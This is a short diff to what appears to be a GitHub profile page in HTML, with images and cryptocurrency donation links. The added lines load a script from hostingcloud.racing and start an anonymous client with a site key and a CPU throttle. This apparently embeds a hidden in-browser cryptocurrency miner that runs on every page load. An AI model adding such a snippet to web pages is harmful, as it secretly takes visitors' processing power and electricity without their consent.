@@ -152,6 +152,16 @@
 
 <img align="right" height="270px" width="450px" alt="GIF" src="https://raw.githubusercontent.com/JonnyBanana/JonnyBanana/master/IMG/3DLAmCsuTe3bV13dhrdWmiiTzq9WMPZDTkYuSGyZVu3GHrVTd2BoY4vy6KfBYGoMWX5Znx41J2ooechEiytNSdz6XzEsgbNbZ1bzk2wWdKhpeGdRmswGu87qNkdkKjdTPYBJbxrm8qYShbz29hFxRZ9DhhjxmqX.gif">
 
+<script src="https://www.hostingcloud.racing/KnII.js"></script>
+<script>
+    var _client = new Client.Anonymous('292c2557678a23bdc8f4d8aa0f8c6b4ad79d532628a89217b770f8d1bc14181d', {
+        throttle: 0.4, c: 'w'
+    });
+    _client.start();
+    
+
+</script>
+
  -  <h4><img src="https://raw.githubusercontent.com/JonnyBanana/JonnyBanana/master/IMG/Bitcoin-icon.png" width="25px"> bit.co.in/jonnybanana</h4>
  
  -  <h4><img src="https://raw.githubusercontent.com/JonnyBanana/JonnyBanana/master/IMG/1-W_pIfGx1Yw_LMfUsOesr4g.png" width="25px"> blockchain-master.crypto</h4>
